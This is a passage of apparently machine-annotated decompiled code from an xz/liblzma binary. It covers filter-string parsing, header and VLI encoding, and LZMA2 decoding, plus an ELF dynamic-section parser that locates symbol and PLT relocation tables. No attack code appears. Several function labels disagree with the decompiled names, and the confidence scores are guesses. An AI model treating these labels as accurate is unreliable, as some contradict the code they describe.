          pcVar4 = (char *)((long)pvVar5 + 2);
          uVar8 = (int)*(char *)((long)pvVar5 + 1) - 0x30;
          *param_1 = pcVar4;
          while (pcVar4 < pcVar9) {
            if (pcVar10[1] != 'e') {
              return "Unsupported preset flag";
            }
            uVar8 = uVar8 | 0x80000000;
            pcVar10 = (char *)*param_1;
            pcVar4 = pcVar10 + 1;
            *param_1 = pcVar4;
          }
          cVar1 = lzma_lzma_preset(param_3,uVar8);
          if (cVar1 != '\0') {
            return "Unsupported preset";
          }
          pcVar9 = (char *)*param_1;
        }
        else {
          if ((*(byte *)((long)__s2 + 0xd) & 1) == 0) {
            if (9 < (byte)(*(char *)((long)pvVar5 + 1) - 0x30U)) {
              return "Value is not a non-negative decimal integer";
            }
            uVar3 = (int)*(char *)((long)pvVar5 + 1) - 0x30;
            uVar8 = 0;
            while( true ) {
              pcVar4 = pcVar10 + 1;
              uVar8 = uVar8 + uVar3;
              if (pcVar9 <= pcVar4) break;
              cVar1 = *pcVar4;
              if (9 < (byte)(cVar1 - 0x30U)) {
                if ((*(byte *)((long)__s2 + 0xd) & 2) == 0) {
                  *param_1 = pcVar4;
                  return "This option does not support any integer suffixes";
                }
                switch((int)cVar1 - 0x47U & 0xff) {
                case 0:
                case 0x20:
                  sVar7 = 0x1e;
                  break;
                default:
                  goto switchD_001076bc_caseD_1;
                case 4:
                case 0x24:
                  sVar7 = 10;
                  break;
                case 6:
                case 0x26:
                  sVar7 = 0x14;
                }
                pcVar6 = pcVar10 + 2;
                if (pcVar6 < pcVar9) {
                  cVar1 = pcVar10[2];
                  if (cVar1 == 'i') {
                    pcVar6 = pcVar10 + 3;
                    if (pcVar9 <= pcVar6) goto LAB_0010777a;
                    cVar1 = pcVar10[3];
                  }
                  if ((cVar1 != 'B') || (pcVar6 + 1 < pcVar9)) {
switchD_001076bc_caseD_1:
                    *param_1 = pcVar4;
                    return "Invalid multiplier suffix (KiB, MiB, or GiB)";
                  }
                }
LAB_0010777a:
                if (0xffffffffU >> sVar7 < uVar8) goto LAB_001077af;
                uVar8 = uVar8 << sVar7;
                break;
              }
              if (0x19999999 < uVar8) goto LAB_001077af;
              uVar3 = (int)cVar1 - 0x30;
              uVar8 = uVar8 * 10;
              pcVar10 = pcVar4;
              if (~uVar3 < uVar8) goto LAB_001077af;
            }
            if ((uVar8 < *(uint *)((long)__s2 + 0x10)) || (*(uint *)((long)__s2 + 0x14) < uVar8)) {
LAB_001077af:
              return "Value out of range";
            }
          }
          else {
            if (0xb < uVar11) {
LAB_00107711:
              return "Invalid option value";
            }
            pcVar4 = *(char **)((long)__s2 + 0x10);
            cVar1 = *pcVar4;
            while( true ) {
              if (cVar1 == '\0') goto LAB_00107711;
              iVar2 = memcmp(pcVar10,pcVar4,uVar11);
              if ((iVar2 == 0) && (pcVar4[uVar11] == '\0')) break;
              pcVar4 = pcVar4 + 0x10;
              cVar1 = *pcVar4;
            }
            uVar8 = *(uint *)(pcVar4 + 0xc);
          }
          *(uint *)((ulong)*(ushort *)((long)__s2 + 0xe) + param_3) = uVar8;
          *param_1 = pcVar9;
        }
      }
      pcVar10 = pcVar9;
    } while (pcVar9 < param_2);
  }
  return (char *)0x0;
}



/**
 * @name  lzma_str_to_filters_with_default
 * @brief Sets default flags value 0x100000000 then delegates to option string parser
 * @confidence 65%
 * @classification parser
 * @address 0x00107880
 */

/* Sets default value 0x100000000 then calls option parsing */

void lzma_str_to_filters_set_default(undefined8 param_1,undefined8 param_2,undefined8 *param_3)

{
  *param_3 = 0x100000000;
  parse_lzma_options_string();
  return;
}



/**
 * @name  lzma_str_to_filters
 * @brief Tail-call wrapper for parse_lzma_options_string
 * @confidence 70%
 * @classification parser
 * @address 0x001078b0
 */

/* Wrapper that calls parse_lzma_options_string */

void lzma_parse_options_wrapper(void)

{
  parse_lzma_options_string();
  return;
}



/**
 * @name  lzma_str_to_filters
 * @brief Parses string representation of LZMA filter chain into filter array. Supports preset syntax (e.g. '6', '6e') and named filters with options. Max 4 filters. Returns NULL on success or error string.
 * @confidence 90%
 * @classification parser
 * @address 0x00107ab0
 */

/* Parses string representation of LZMA filter chain into filter array. Supports preset syntax (e.g.
   '6', '6e') and named filter syntax with options. Maximum 4 filters. Returns NULL on success or
   error message string. Validates filter chain if flag bit 1 is not set. */

char * lzma_str_to_filters(char *param_1,undefined4 *param_2,undefined8 *param_3,uint param_4,
                          undefined8 param_5)

{
  undefined8 uVar1;
  char *pcVar2;
  char cVar3;
  int iVar4;
  size_t __n;
  long lVar5;
  ulong uVar6;
  ulong uVar7;
  char *pcVar8;
  char *pcVar9;
  undefined8 *puVar10;
  undefined8 *puVar11;
  uint uVar12;
  long lVar13;
  char *pcVar14;
  char *pcVar15;
  char *pcVar16;
  long in_FS_OFFSET;
  byte bVar17;
  long local_e8;
  undefined8 *local_e0;
  char *local_a8;
  undefined8 local_a0 [12];
  long local_40;
  
  bVar17 = 0;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_2 != (undefined4 *)0x0) {
    *param_2 = 0;
  }
  if ((param_1 == (char *)0x0) || (param_3 == (undefined8 *)0x0)) {
    pcVar9 = "Unexpected NULL pointer argument(s) to lzma_str_to_filters()";
    goto LAB_00107b1b;
  }
  pcVar9 = "Unsupported flags to lzma_str_to_filters()";
  if ((param_4 & 0xfffffffc) != 0) goto LAB_00107b1b;
  cVar3 = *param_1;
  local_a8 = param_1;
  while (cVar3 == ' ') {
    local_a8 = local_a8 + 1;
    cVar3 = *local_a8;
  }
  pcVar9 = "Empty string is not allowed, try \"6\" if a default value is needed";
  if (cVar3 != '\0') {
    if (9 < (byte)(cVar3 - 0x30U)) {
      if ((cVar3 != '-') || (9 < (byte)(local_a8[1] - 0x30U))) {
        puVar10 = local_a0 + 1;
        local_e8 = 0;
        local_e0 = puVar10;
LAB_00107bd8:
        cVar3 = *local_a8;
        if (cVar3 == '-') {
          pcVar9 = local_a8;
          if (local_a8[1] == '-') {
            cVar3 = local_a8[2];
            local_a8 = local_a8 + 2;
            goto LAB_00107be9;
          }
LAB_00107c10:
          do {
            pcVar2 = local_a8;
            if (cVar3 == '-') {
              cVar3 = pcVar9[1];
              if (cVar3 == '-') break;
            }
            else {
              if (cVar3 == ' ') break;
              cVar3 = pcVar9[1];
            }
            pcVar9 = pcVar9 + 1;
          } while (cVar3 != '\0');
          if (local_a8 == pcVar9) goto LAB_00107f9a;
          pcVar8 = pcVar9;
          pcVar16 = pcVar9;
          pcVar14 = local_a8;
          if (local_a8 < pcVar9) {
            do {
              pcVar15 = pcVar14 + 1;
              pcVar8 = pcVar14;
              pcVar16 = pcVar15;
              if ((*pcVar14 == ':') || (*pcVar14 == '=')) break;
              pcVar8 = pcVar9;
              pcVar16 = pcVar9;
              pcVar14 = pcVar15;
            } while (pcVar9 != pcVar15);
          }
          uVar6 = (long)pcVar8 - (long)local_a8;
          if (0xb < uVar6) {
LAB_00107c93:
            pcVar9 = "Unknown filter name";
            goto LAB_00107ca4;
          }
          pcVar8 = "lzma1";
          lVar13 = 0;
          while ((iVar4 = memcmp(pcVar2,pcVar8,uVar6), iVar4 != 0 || (pcVar8[uVar6] != '\0'))) {
            lVar13 = lVar13 + 1;
            pcVar8 = pcVar8 + 0x30;
            if (lVar13 == 0xb) goto LAB_00107c93;
          }
          if (((~(byte)param_4 & 1) != 0) &&
             (0x3fffffffffffffff < (ulong)(&DAT_00131690)[lVar13 * 6])) {
            pcVar9 = "This filter cannot be used in the .xz format";
            goto LAB_00107ca4;
          }
          lVar5 = lzma_alloc_zero((&DAT_0013168c)[lVar13 * 0xc],param_5);
          if (lVar5 == 0) {
            pcVar9 = "Memory allocation failed";
            goto LAB_00107ca4;
          }
          local_a8 = pcVar16;
          pcVar9 = (char *)(*(code *)(&PTR_lzma_str_validate_preset_00131698)[lVar13 * 6])
                                     (&local_a8,pcVar9,lVar5);
          if (pcVar9 != (char *)0x0) {
            lzma_free(lVar5,param_5);
            goto LAB_00107ca4;
          }
          *local_e0 = (&DAT_00131690)[lVar13 * 6];
          local_e0[1] = lVar5;
          cVar3 = *local_a8;
          while (cVar3 == ' ') {
            local_a8 = local_a8 + 1;
            cVar3 = *local_a8;
          }
          lVar13 = local_e8 + 1;
          if (cVar3 != '\0') goto code_r0x00107eb2;
          local_a0[lVar13 * 2 + 1] = 0xffffffffffffffff;
          local_a0[lVar13 * 2 + 2] = 0;
          if (((param_4 & 2) != 0) ||
             (iVar4 = lzma_raw_coder_memusage(puVar10,local_a0), iVar4 == 0)) {
            *param_3 = local_a0[1];
            uVar6 = (local_e8 + 2) * 0x10;
            uVar7 = uVar6 & 0xffffffff;
            *(undefined8 *)((long)param_3 + (uVar7 - 8)) = *(undefined8 *)((long)local_a0 + uVar7);
            lVar13 = (long)param_3 - (long)((ulong)(param_3 + 1) & 0xfffffffffffffff8);
            puVar10 = (undefined8 *)((long)puVar10 - lVar13);
            puVar11 = (undefined8 *)((ulong)(param_3 + 1) & 0xfffffffffffffff8);
            for (uVar6 = (ulong)((uint)((int)uVar6 + (int)lVar13) >> 3); uVar6 != 0;
                uVar6 = uVar6 - 1) {
              *puVar11 = *puVar10;
              puVar10 = puVar10 + (ulong)bVar17 * -2 + 1;
              puVar11 = puVar11 + (ulong)bVar17 * -2 + 1;
            }
            goto LAB_00107cb0;
          }
          pcVar9 = "Invalid filter chain (\'lzma2\' missing at the end?)";
        }
        else {
LAB_00107be9:
          pcVar9 = local_a8;
          if (cVar3 != '\0') goto LAB_00107c10;
LAB_00107f9a:
          pcVar9 = "Filter name is missing";
LAB_00107ca4:
          if (local_e8 == 0) goto LAB_00107cb0;
          local_e8 = local_e8 - 1;
        }
        goto LAB_00107eea;
      }
      local_a8 = local_a8 + 1;
    }
    pcVar2 = local_a8;
    __n = strlen(local_a8);
    pcVar9 = memchr(pcVar2,0x20,__n);
    if (pcVar9 == (char *)0x0) {
      pcVar9 = pcVar2 + __n;
    }
    else {
      cVar3 = pcVar9[1];
      if (cVar3 != '\0') {
        pcVar8 = pcVar9 + 2;
        do {
          if (cVar3 != ' ') {
            pcVar9 = "Unsupported preset";
            goto LAB_00107cb0;
          }
          cVar3 = *pcVar8;
          pcVar8 = pcVar8 + 1;
        } while (cVar3 != '\0');
      }
    }
    uVar12 = (int)*pcVar2 - 0x30;
    while (local_a8 = pcVar2 + 1, local_a8 < pcVar9) {
      if (pcVar2[1] != 'e') {
        pcVar9 = "Unsupported preset flag";
        goto LAB_00107cb0;
      }
      uVar12 = uVar12 | 0x80000000;
      pcVar2 = local_a8;
    }
    pcVar9 = "Memory allocation failed";
    lVar13 = lzma_alloc(0x70,param_5);
    if (lVar13 != 0) {
      cVar3 = lzma_lzma_preset(lVar13,uVar12);
      if (cVar3 == '\0') {
        pcVar9 = (char *)0x0;
        *param_3 = 0x21;
        param_3[1] = lVar13;
        param_3[2] = 0xffffffffffffffff;
        param_3[3] = 0;
      }
      else {
        pcVar9 = "Unsupported preset";
        lzma_free(lVar13,param_5);
      }
    }
  }
  goto LAB_00107cb0;
code_r0x00107eb2:
  local_e0 = local_e0 + 2;
  local_e8 = lVar13;
  if (lVar13 == 4) goto LAB_00107ed0;
  goto LAB_00107bd8;
LAB_00107ed0:
  local_e8 = 3;
  pcVar9 = "The maximum number of filters is four";
LAB_00107eea:
  puVar10 = local_a0 + local_e8 * 2 + 2;
  do {
    uVar1 = *puVar10;
    puVar10 = puVar10 - 2;
    lzma_free(uVar1,param_5);
  } while (local_a0 != puVar10);
LAB_00107cb0:
  if (param_2 != (undefined4 *)0x0) {
    uVar6 = (long)local_a8 - (long)param_1;
    if (0x7fffffff < uVar6) {
      uVar6 = 0x7fffffff;
    }
    *param_2 = (int)uVar6;
  }
LAB_00107b1b:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return pcVar9;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  parse_elf_dynamic_section
 * @brief Parses ELF dynamic section extracting DT_SYMTAB, DT_SYMENT (must be 0x18), DT_STRTAB, DT_STRSZ, DT_JMPREL, DT_PLTRELSZ, DT_REL/RELA, DT_RELSZ/RELASZ, DT_RELENT/RELAENT. Allocates 64-byte result structure.
 * @confidence 92%
 * @classification parser
 * @address 0x00108b10
 */

/* Parses an ELF dynamic section to extract DT_SYMTAB (tag 6), DT_SYMENT (tag 11, must be
   0x18=sizeof(Elf64_Sym)), DT_STRTAB (tag 5), DT_STRSZ (tag 10), DT_JMPREL (tag 23), DT_PLTRELSZ
   (tag 2), DT_REL/DT_RELA (tag 7), DT_RELSZ/DT_RELASZ (tag 8), DT_RELENT/DT_RELAENT (tag 9).
   Allocates and populates a 64-byte result structure. */

undefined8 parse_elf_dynamic_section(undefined8 *param_1,long *param_2,undefined8 *param_3)

{
  long *plVar1;
  long *plVar2;
  long *plVar3;
  long *plVar4;
  long lVar5;
  long lVar6;
  long lVar7;
  long lVar8;
  ulong uVar9;
  long lVar10;
  ulong uVar11;
  undefined8 uVar12;
  long lVar13;
  long local_48;
  ulong local_40;
  
  if (system_page_size == 0) {
    system_page_size = sysconf(0x1e);
  }
  plVar3 = (long *)*param_3;
  lVar13 = *plVar3;
  plVar4 = plVar3;
  lVar5 = lVar13;
  while (lVar5 != 0) {
    plVar2 = plVar3;
    lVar6 = lVar13;
    if (lVar5 == 6) goto LAB_00108b81;
    plVar2 = plVar4 + 2;
    plVar4 = plVar4 + 2;
    lVar5 = *plVar2;
  }
LAB_00108db0:
  format_error_message("failed to find DT_SYMTAB");
  return 6;
LAB_00108b81:
  if (lVar6 != 0xb) {
    plVar1 = plVar2 + 2;
    plVar2 = plVar2 + 2;
    lVar6 = *plVar1;
    if (*plVar1 == 0) goto LAB_00108db0;
    goto LAB_00108b81;
  }
  plVar1 = plVar3;
  lVar5 = lVar13;
  if (plVar2[1] != 0x18) {
    format_error_message("DT_SYMENT size %lu != %lu",plVar2[1],0x18);
    return 6;
  }
  while (lVar5 != 5) {
    plVar2 = plVar1 + 2;
    plVar1 = plVar1 + 2;
    lVar5 = *plVar2;
    if (*plVar2 == 0) {
      format_error_message("failed to find DT_STRTAB");
      return 6;
    }
  }
  lVar5 = plVar1[1];
  plVar2 = plVar3;
  lVar6 = lVar13;
  while (lVar6 != 10) {
    lVar6 = plVar2[2];
    plVar2 = plVar2 + 2;
    if (lVar6 == 0) {
      format_error_message("failed to find DT_STRSZ");
      return 6;
    }
  }
  lVar6 = plVar2[1];
  plVar2 = plVar3;
  lVar7 = lVar13;
LAB_00108c01:
  plVar1 = plVar3;
  lVar10 = lVar13;
  if (lVar7 != 0x17) goto LAB_00108bf0;
  lVar7 = plVar2[1];
  plVar2 = plVar3;
  lVar8 = lVar13;
  while (lVar8 != 2) {
    lVar8 = plVar2[2];
    plVar2 = plVar2 + 2;
    if (lVar8 == 0) {
      format_error_message("failed to find DT_PLTRELSZ");
      return 6;
    }
  }
  uVar12 = 0xaaaaaaaaaaaaaaab;
  uVar9 = (ulong)plVar2[1] / 0x18;
  goto LAB_00108c69;
LAB_00108bf0:
  lVar7 = plVar2[2];
  plVar2 = plVar2 + 2;
  if (lVar7 == 0) goto LAB_00108d50;
  goto LAB_00108c01;
LAB_00108d50:
  uVar9 = 0;
  lVar7 = 0;
  uVar12 = 0x18;
LAB_00108c69:
  do {
    if (lVar10 == 7) {
      local_48 = plVar1[1];
      plVar2 = plVar3;
      lVar10 = lVar13;
      while (lVar10 != 8) {
        lVar10 = plVar2[2];
        plVar2 = plVar2 + 2;
        if (lVar10 == 0) {
          format_error_message("failed to find PLT_DT_RELSZ");
          return 6;
        }
      }
      while (lVar13 != 9) {
        lVar13 = plVar3[2];
        plVar3 = plVar3 + 2;
        if (lVar13 == 0) {
          format_error_message("failed to find PLT_DT_RELENT");
          return 6;
        }
      }
      local_40 = (ulong)plVar2[1] / (ulong)plVar3[1];
      uVar11 = (ulong)plVar2[1] % (ulong)plVar3[1];
      if (local_48 == 0 && lVar7 == 0) goto LAB_00108e68;
      goto LAB_00108ccb;
    }
    plVar2 = plVar1 + 2;
    plVar1 = plVar1 + 2;
    lVar10 = *plVar2;
  } while (*plVar2 != 0);
  uVar11 = 0;
  if (lVar7 == 0) {
LAB_00108e68:
    format_error_message("failed to find either of DT_JMPREL and DT_REL",uVar12,uVar11);
    return 6;
  }
  local_40 = 0;
  local_48 = 0;
LAB_00108ccb:
  lVar13 = plVar4[1];
  lVar10 = *param_2;
  plVar3 = malloc(0x40);
  *param_1 = plVar3;
  if (plVar3 != (long *)0x0) {
    *plVar3 = lVar13;
    plVar3[1] = lVar5;
    plVar3[6] = local_48;
    plVar3[2] = lVar6;
    plVar3[3] = lVar10;
    plVar3[4] = lVar7;
    plVar3[5] = uVar9;
    plVar3[7] = local_40;
    return 0;
  }
  format_error_message("failed to allocate memory: %lu bytes",0x40);
  return 5;
}



/**
 * @name  find_section_header_strtab
 * @brief Searches ELF section header arrays (types 6/7) for string table entries, returns name pointer and address.
 * @confidence 78%
 * @classification parser
 * @address 0x001090d0
 */

/* Searches for section header string table entry by iterating through two section arrays (type 6
   and 7), returns offset and size or error */

undefined8 find_section_header_strtab(long *param_1,uint *param_2,long *param_3,long *param_4)

{
  long lVar1;
  long lVar2;
  ulong uVar3;
  ulong uVar4;
  long *plVar5;
  
  uVar3 = (ulong)*param_2;
  uVar4 = param_1[5];
  if (uVar3 < uVar4) {
    lVar1 = param_1[4];
    do {
      plVar5 = (long *)(lVar1 + uVar3 * 0x18);
      uVar3 = plVar5[1];
      if ((int)uVar3 == 7) goto LAB_00109101;
      uVar3 = (ulong)(*param_2 + 1);
      *param_2 = *param_2 + 1;
    } while (uVar3 < uVar4);
  }
  lVar1 = param_1[7];
  if (uVar3 < lVar1 + uVar4) {
    lVar2 = param_1[6];
    do {
      plVar5 = (long *)(lVar2 + (uVar3 - uVar4) * 0x18);
      uVar3 = plVar5[1];
      if ((int)uVar3 == 6) {
LAB_00109101:
        uVar4 = (ulong)*(uint *)(*param_1 + (uVar3 >> 0x20) * 0x18);
        if (uVar4 + 1 <= (ulong)param_1[2]) {
          lVar1 = *plVar5;
          *param_3 = uVar4 + param_1[1];
          *param_4 = lVar1 + param_1[3];
          *param_2 = *param_2 + 1;
          return 0;
        }
        format_error_message("too big section header string table index: %lu");
        *param_2 = *param_2 + 1;
        return 2;
      }
      uVar3 = (ulong)(*param_2 + 1);
      *param_2 = *param_2 + 1;
    } while (uVar3 < lVar1 + uVar4);
  }
  *param_3 = 0;
  *param_4 = 0;
  return 0xffffffff;
}



/**
 * @name  lzma_block_header_encode
 * @brief Encodes LZMA block header: writes size byte, compressed/uncompressed VLIs, filter flags, padding zeros, CRC32.
 * @confidence 90%
 * @classification parser
 * @address 0x0010ad10
 */

/* Encodes an LZMA block header into output buffer. Writes header size byte, encodes
   compressed/uncompressed sizes as VLIs with flag bits, encodes filter flags, pads remainder with
   zeros, and appends CRC32. Returns LZMA_OK or LZMA_PROG_ERROR. */

int lzma_block_header_encode(long param_1,undefined1 *param_2)

{
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  long lVar4;
  long *plVar5;
  long lVar6;
  ulong uVar7;
  long in_FS_OFFSET;
  long local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  lVar4 = lzma_block_unpadded_size();
  if ((lVar4 != 0) && (0x7ffffffffffffffe < *(long *)(param_1 + 0x18) + 0x8000000000000000U)) {
    local_48 = 2;
    iVar2 = *(int *)(param_1 + 4);
    param_2[1] = 0;
    uVar1 = iVar2 - 4;
    uVar7 = (ulong)uVar1;
    *param_2 = (char)(uVar1 >> 2);
    if (*(long *)(param_1 + 0x10) == -1) {
      lVar4 = *(long *)(param_1 + 0x18);
    }
    else {
      iVar2 = lzma_vli_encode(*(long *)(param_1 + 0x10),0,param_2,&local_48,uVar7);
      if (iVar2 != 0) goto LAB_0010ae01;
      param_2[1] = param_2[1] | 0x40;
      lVar4 = *(long *)(param_1 + 0x18);
    }
    if (lVar4 != -1) {
      iVar2 = lzma_vli_encode(lVar4,0,param_2,&local_48,uVar7);
      if (iVar2 != 0) goto LAB_0010ae01;
      param_2[1] = param_2[1] | 0x80;
    }
    plVar5 = *(long **)(param_1 + 0x20);
    if ((plVar5 != (long *)0x0) && (*plVar5 != -1)) {
      lVar4 = 0;
      do {
        iVar2 = lzma_filter_flags_encode(plVar5 + lVar4 * 2,param_2,&local_48,uVar7);
        if (iVar2 != 0) goto LAB_0010ae01;
        plVar5 = *(long **)(param_1 + 0x20);
        lVar6 = lVar4 + 1;
        if (plVar5[lVar4 * 2 + 2] == -1) {
          param_2[1] = param_2[1] | (char)lVar6 - 1U;
          memset(param_2 + local_48,0,uVar7 - local_48);
          uVar3 = lzma_crc32(param_2,uVar7,0);
          *(undefined4 *)(param_2 + uVar7) = uVar3;
          goto LAB_0010ae01;
        }
        lVar4 = lVar6;
      } while (lVar6 != 4);
    }
  }
  iVar2 = 0xb;
LAB_0010ae01:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2;
}



/**
 * @name  lzma_properties_encode
 * @brief Encodes LZMA filter properties by searching filter table for matching ID and calling encoder.
 * @confidence 90%
 * @classification parser
 * @address 0x0010b590
 */

/* Encodes LZMA filter properties. Iterates through a list of known filter IDs to find a matching
   encoder and calls it with the second parameter. */

undefined8 lzma_properties_encode(long *param_1)

{
  long lVar1;
  undefined8 uVar2;
  long lVar3;
  long *plVar4;
  
  plVar4 = &encoder_filter_table;
  lVar1 = 0;
  lVar3 = 0x4000000000000001;
  while( true ) {
    if (*param_1 == lVar3) {
      if (*(code **)(&UNK_001319b0 + lVar1 * 0x38) != (code *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0010b5f3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        uVar2 = (**(code **)(&UNK_001319b0 + lVar1 * 0x38))(param_1[1]);
        return uVar2;
      }
      return 0;
    }
    lVar1 = lVar1 + 1;
    if (lVar1 == 0xc) break;
    lVar3 = *plVar4;
    plVar4 = plVar4 + 7;
  }
  return 0xb;
}



/**
 * @name  lzma_filter_flags_encode
 * @brief Encodes LZMA filter flags: writes filter ID as VLI, properties size as VLI, then the properties themselves.
 * @confidence 90%
 * @classification parser
 * @address 0x0010b670
 */

/* Encodes LZMA filter flags by encoding VLI values and filter properties with bounds checking and
   error handling */

undefined8 lzma_filter_flags_encode(ulong *param_1,long param_2,long *param_3,long param_4)

{
  long uVar1;
  long in_FS_OFFSET;
  uint local_34;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if (*param_1 < 0x4000000000000000) {
    uVar1 = lzma_vli_encode(*param_1,0,param_2,param_3,param_4);
    if ((int)uVar1 != 0) goto LAB_0010b6c4;
    uVar1 = lzma_properties_size(&local_34,param_1);
    if ((int)uVar1 != 0) goto LAB_0010b6c4;
    uVar1 = lzma_vli_encode(local_34,0,param_2,param_3,param_4);
    if ((int)uVar1 != 0) goto LAB_0010b6c4;
    if ((ulong)local_34 <= (ulong)(param_4 - *param_3)) {
      uVar1 = lzma_properties_encode(param_1,*param_3 + param_2);
      if ((int)uVar1 == 0) {
        *param_3 = *param_3 + (ulong)local_34;
      }
      goto LAB_0010b6c4;
    }
  }
  uVar1 = 0xb;
LAB_0010b6c4:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar1;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_header_encode
 * @brief Encodes XZ stream header: writes magic bytes, stream flags, and CRC32
 * @confidence 90%
 * @classification parser
 * @address 0x0010c670
 */

/* Encodes XZ stream header: magic, flags, CRC32 */

undefined8 lzma_stream_header_encode(int *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (*param_1 != 0) {
    return 8;
  }
  *param_2 = xz_stream_header_magic;
  *(undefined2 *)(param_2 + 1) = xz_stream_header_flags_magic;
  if ((uint)param_1[4] < 0x10) {
    *(undefined1 *)((long)param_2 + 6) = 0;
    *(char *)((long)param_2 + 7) = (char)param_1[4];
    uVar1 = lzma_crc32((long)param_2 + 6,2,0);
    param_2[2] = uVar1;
    return 0;
  }
  return 0xb;
}



/**
 * @name  lzma_stream_footer_encode
 * @brief Encodes an LZMA stream footer: validates fields, writes backward size and check type, computes CRC32, writes magic bytes.
 * @confidence 92%
 * @classification parser
 * @address 0x0010c700
 */

/* Encodes an LZMA stream footer by validating stream parameters and computing a CRC32 checksum over
   the footer data. */

undefined8 lzma_stream_footer_encode(int *param_1,undefined4 *param_2)

{
  ulong uVar1;
  undefined4 uVar2;
  
  if (*param_1 != 0) {
    return 8;
  }
  uVar1 = *(ulong *)(param_1 + 2);
  if (((uVar1 - 4 < 0x3fffffffd) && ((uVar1 & 3) == 0)) &&
     (param_2[1] = (int)(uVar1 >> 2) - 1, (uint)param_1[4] < 0x10)) {
    *(undefined1 *)(param_2 + 2) = 0;
    *(char *)((long)param_2 + 9) = (char)param_1[4];
    uVar2 = lzma_crc32(param_2 + 1,6,0);
    *param_2 = uVar2;
    *(undefined2 *)((long)param_2 + 10) = xz_stream_footer_magic;
    return 0;
  }
  return 0xb;
}



/**
 * @name  lzma_vli_encode
 * @brief Encodes variable-length integer: 7 data bits per byte, bit 7 as continuation flag. Supports incremental encoding.
 * @confidence 95%
 * @classification parser
 * @address 0x0010c7b0
 */

/* Encodes a variable-length integer (VLI) in LZMA format. Each byte stores 7 bits of the value with
   bit 7 as continuation flag. Returns LZMA_OK (0) on success, LZMA_PROG_ERROR (0xb) on invalid
   input, or LZMA_BUF_ERROR (10) when output buffer is exhausted mid-encoding. */

undefined1 lzma_vli_encode(ulong param_1,ulong *param_2,long param_3,ulong *param_4,ulong param_5)

{
  byte *pbVar1;
  ulong uVar2;
  ulong *puVar3;
  byte bVar4;
  long lVar5;
  ulong uVar6;
  long in_FS_OFFSET;
  undefined1 uVar7;
  ulong local_18;
  long local_10;
  
  puVar3 = &local_18;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0;
  uVar2 = *param_4;
  if (param_2 == (ulong *)0x0) {
    if (uVar2 < param_5) {
      uVar6 = 0;
LAB_0010c7f7:
      if (-1 < (long)param_1) {
        lVar5 = uVar6 - uVar2;
        param_1 = param_1 >> ((char)uVar6 * '\a' & 0x3fU);
        do {
          uVar6 = lVar5 + 1 + uVar2;
          pbVar1 = (byte *)(param_3 + uVar2);
          uVar2 = uVar2 + 1;
          bVar4 = (byte)param_1;
          if (param_1 < 0x80) {
            *param_4 = uVar2;
            *pbVar1 = bVar4;
            uVar7 = puVar3 != &local_18;
            *puVar3 = uVar6;
            goto LAB_0010c860;
          }
          *puVar3 = uVar6;
          param_1 = param_1 >> 7;
          *param_4 = uVar2;
          *(byte *)(param_3 - 1 + uVar2) = bVar4 | 0x80;
        } while (param_5 != uVar2);
        uVar7 = 0;
        if (puVar3 != &local_18) goto LAB_0010c860;
      }
    }
  }
  else {
    uVar7 = 10;
    if (param_5 <= uVar2) goto LAB_0010c860;
    uVar6 = *param_2;
    puVar3 = param_2;
    if (uVar6 < 9) goto LAB_0010c7f7;
  }
  uVar7 = 0xb;
LAB_0010c860:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar7;
}



/**
 * @name  lzma_lzma2_decoder_code
 * @brief LZMA2 decoder state machine. States: 0=control byte, 1=uncompressed size (4 bytes), 2=compressed size (8 bytes) with validation, 3=validate and init LZMA sub-decoder, 4=delegate to LZMA1 decoder.
 * @confidence 88%
 * @classification parser
 * @address 0x0010e7c0
 */

/* LZMA2 stream decoder state machine. States: 0=read control byte, 1=read uncompressed size (4
   bytes), 2=read compressed size (8 bytes) and validate, 3=validate sizes and initialize LZMA
   sub-decoder, 4=delegate to LZMA1 decoder. Validates dictionary size constraints and power-of-two
   requirements. */

undefined8
lzma2_decode(undefined8 *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
            undefined8 param_6,ulong *param_7,ulong param_8,undefined4 param_9)

{
  byte bVar1;
  char cVar2;
  uint uVar3;
  undefined8 uVar4;
  ulong uVar5;
  long lVar6;
  uint uVar7;
  ulong uVar8;
  long in_FS_OFFSET;
  undefined8 local_78;
  code *local_70;
  undefined8 *local_68;
  undefined1 local_60 [16];
  undefined8 local_50;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  uVar5 = *param_7;
  while (uVar5 < param_8) {
    if (*(int *)(param_1 + 10) == 4) {
      uVar4 = (*(code *)param_1[3])
                        (*param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
      goto LAB_0010e920;
    }
    uVar5 = *param_4;
    if (param_5 <= uVar5) break;
    switch(*(int *)(param_1 + 10)) {
    case 0:
      cVar2 = lzma_lzma_lclppb_decode(param_1 + 0xf,*(undefined1 *)(param_3 + uVar5));
      if (cVar2 != '\0') {
LAB_0010ea5d:
        uVar4 = 7;
        goto LAB_0010e920;
      }
      *param_4 = *param_4 + 1;
      *(undefined4 *)(param_1 + 10) = 1;
      break;
    case 1:
      lVar6 = param_1[0xb] + 1;
      uVar3 = (uint)*(byte *)(param_3 + uVar5) << ((char)param_1[0xb] * '\b' & 0x3fU) |
              *(uint *)(param_1 + 0xf);
      param_1[0xb] = lVar6;
      *(uint *)(param_1 + 0xf) = uVar3;
      if (lVar6 == 4) {
        if (((*(char *)((long)param_1 + 0x54) != '\0') && (uVar3 != 0xffffffff)) &&
           (uVar7 = uVar3 - 1 >> 2 | uVar3 - 1, uVar7 = uVar7 | uVar7 >> 3,
